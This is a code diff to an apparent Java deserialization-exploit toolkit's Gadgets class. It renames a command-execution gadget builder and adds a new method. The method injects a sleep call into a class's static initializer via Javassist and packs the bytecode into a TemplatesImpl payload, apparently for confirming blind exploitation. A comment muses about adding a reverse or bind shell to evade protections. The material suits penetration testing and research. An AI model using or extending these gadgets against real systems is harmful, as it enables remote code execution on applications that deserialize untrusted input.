@@ -64,7 +64,7 @@ public class Gadgets {
 		return map;
 	}
 
-	public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {
+	public static TemplatesImpl createTemplatesImplExec(final String command) throws Exception {
 		final TemplatesImpl templates = new TemplatesImpl();		
 		
 		// use template gadget class
@@ -89,4 +89,32 @@ public class Gadgets {
 		Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
 		return templates;
 	}
+	
+	public static TemplatesImpl createTemplatesImplSleep(final String command) throws Exception {
+		final TemplatesImpl templates = new TemplatesImpl();
+		
+		long timeToSleep = Long.parseLong(command);
+		
+		// use template gadget class
+		ClassPool pool = ClassPool.getDefault();
+		pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
+		final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+		// run command in static initializer
+		// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+		clazz.makeClassInitializer().insertAfter("java.lang.Thread.sleep((long)" + timeToSleep + ");");
+		// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+		clazz.setName("ysoserial.Pwner" + System.nanoTime());		
+		
+		final byte[] classBytes = clazz.toBytecode();
+		
+		// inject class bytes into instance
+		Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+			classBytes,
+			ClassFiles.classAsBytes(Foo.class)});
+		
+		// required to make TemplatesImpl happy
+		Reflections.setFieldValue(templates, "_name", "Pwnr"); 			
+		Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+		return templates;
+	}	
 }
